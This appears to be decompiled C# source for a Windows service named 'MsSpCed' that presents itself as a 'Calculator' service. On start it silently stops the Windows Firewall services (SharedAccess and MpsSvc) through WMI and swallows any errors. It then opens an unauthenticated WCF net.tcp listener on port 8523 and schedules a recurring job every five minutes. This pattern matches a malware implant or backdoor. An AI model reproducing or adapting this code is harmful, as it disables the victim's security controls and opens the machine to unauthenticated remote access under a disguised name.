using System;
using System.Management;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.ServiceProcess;
using System.Threading;
using Quartz;
using Quartz.Impl;
using Sp.Ced.Serv;

namespace ExecutorWS;

public class CalculatorWindowsService : ServiceBase
{
	public ServiceHost serviceHost = null;

	private IScheduler sched;

	public CalculatorWindowsService()
	{
		((ServiceBase)this).set_ServiceName("MsSpCed");
	}

	public static void Main()
	{
		ServiceBase.Run((ServiceBase)(object)new CalculatorWindowsService());
	}

	protected override void OnStart(string[] args)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Expected O, but got Unknown
		try
		{
			ConnectionOptions val = new ConnectionOptions();
			val.set_Impersonation((ImpersonationLevel)3);
			ManagementScope val2 = new ManagementScope("root\\CIMV2", val);
			val2.Connect();
			ManagementObject val3 = new ManagementObject("Win32_Service.Name='SharedAccess'");
			val3.InvokeMethod("StopService", (ManagementBaseObject)null, (InvokeMethodOptions)null);
			ConnectionOptions val4 = new ConnectionOptions();
			val4.set_Impersonation((ImpersonationLevel)3);
			ManagementScope val5 = new ManagementScope("root\\CIMV2", val4);
			val5.Connect();
			ManagementObject val6 = new ManagementObject("Win32_Service.Name='MpsSvc'");
			val6.InvokeMethod("StopService", (ManagementBaseObject)null, (InvokeMethodOptions)null);
		}
		catch (Exception)
		{
		}
		if (serviceHost != null)
		{
			((CommunicationObject)serviceHost).Close();
		}
		serviceHost = new ServiceHost(typeof(CalculatorService), new Uri[0]);
		string text = "net.tcp://localhost:8523/MsSpCedWindowsService";
		new Uri(text);
		NetTcpBinding val7 = new NetTcpBinding();
		val7.set_MaxReceivedMessageSize(10485760L);
		val7.get_Security().set_Mode((SecurityMode)0);
		val7.get_ReaderQuotas().set_MaxArrayLength(10485760);
		serviceHost.AddServiceEndpoint(typeof(ICalculator), (Binding)(object)val7, text);
		((CommunicationObject)serviceHost).Open();
		ISchedulerFactory val8 = (ISchedulerFactory)new StdSchedulerFactory();
		sched = val8.GetScheduler();
		Thread thread = new Thread(DoWork);
		thread.IsBackground = true;
		thread.Start();
	}

	protected override void OnStop()
	{
		try
		{
			sched.Shutdown(false);
		}
		catch (Exception)
		{
		}
		if (serviceHost != null)
		{
			((CommunicationObject)serviceHost).Close();
			serviceHost = null;
		}
	}

	private void DoWork()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		sched.Start();
		JobDetail val = new JobDetail("myJob", (string)null, typeof(Job));
		CronTrigger val2 = new CronTrigger();
		((Trigger)val2).set_Name("cr");
		val2.set_CronExpressionString("0 0/5 * ? * *");
		sched.ScheduleJob(val, (Trigger)(object)val2);
	}
}
